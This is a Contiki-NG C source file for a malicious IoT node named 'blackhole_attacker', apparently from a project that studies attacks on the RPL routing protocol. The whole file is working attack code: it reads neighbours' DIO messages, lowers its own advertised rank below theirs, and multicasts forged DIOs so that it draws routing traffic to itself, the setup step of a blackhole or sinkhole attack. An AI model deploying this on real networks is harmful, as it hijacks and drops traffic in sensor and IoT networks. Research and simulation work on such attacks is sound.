#include "contiki.h"
#include "net/routing/routing.h"
#include "random.h"
#include "net/netstack.h"
#include <stdint.h>
#include <inttypes.h>
#include "attacking-rpl/rpl.h"
#include "net/packetbuf.h"
#include "net/ipv6/uipbuf.h"
#include "net/ipv6/uip.h"
#include "net/ipv6/uip-icmp6.h"

#include "sys/log.h"
#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO

#define WITH_SERVER_REPLY  1

/*---------------------------------------------------------------------------*/
static rpl_rank_t min_rank;
static uip_ipaddr_t root_ipaddr;

/*---------------------------------------------------------------------------*/
PROCESS(blackhole_attacker, "Decreased rank attacker");
AUTOSTART_PROCESSES(&blackhole_attacker);

/*---------------------------------------------------------------------------*/
static enum netstack_ip_action
ip_input(void)
{
  uint8_t proto;

  uipbuf_get_last_header(uip_buf, uip_len, &proto);
  if (proto == UIP_PROTO_ICMP6 && UIP_ICMP_BUF->type == ICMP6_RPL 
      && UIP_ICMP_BUF->icode == RPL_CODE_DIO)
  {
    
    rpl_rank_t rank = (uip_buf[UIP_IPH_LEN + 6] << 8) | uip_buf[UIP_IPH_LEN + 7];

    LOG_INFO("Received DIO with rank: %u from ", rank);
    LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
    LOG_INFO_("\n");
    
    if (rank < min_rank) {
      if (curr_instance.dag.preferred_parent != NULL && 
          rank != curr_instance.dag.preferred_parent->rank)
      {
        min_rank = (curr_instance.dag.preferred_parent->rank + rank) /2;
        curr_instance.dag.rank = min_rank;
        LOG_INFO("Updated rank to: %u\n", curr_instance.dag.rank);
        if (NETSTACK_ROUTING.get_root_ipaddr(&root_ipaddr)) {
          rpl_icmp6_dio_output(&rpl_multicast_addr);
        }
      }
    }    
  }
  return NETSTACK_IP_PROCESS;
}
/*---------------------------------------------------------------------------*/
static enum netstack_ip_action
ip_output(const linkaddr_t *localdest)
{
  return NETSTACK_IP_PROCESS;
}
/*---------------------------------------------------------------------------*/
struct netstack_ip_packet_processor packet_processor = {
  .process_input = ip_input,
  .process_output = ip_output
};

/*---------------------------------------------------------------------------*/

/*---------------------------------------------------------------------------*/
PROCESS_THREAD(blackhole_attacker, ev, data)
{
  static struct etimer periodic_timer;

  PROCESS_BEGIN();

  min_rank = 65535;
  curr_instance.dag.rank = min_rank;

  netstack_ip_packet_processor_add(&packet_processor);

  while (1) {
    
    if (NETSTACK_ROUTING.get_root_ipaddr(&root_ipaddr)) {
      LOG_INFO("Current node rank: %u\n", curr_instance.dag.rank);
    }
    etimer_set(&periodic_timer, 5 * CLOCK_SECOND);
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
    etimer_reset(&periodic_timer);
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
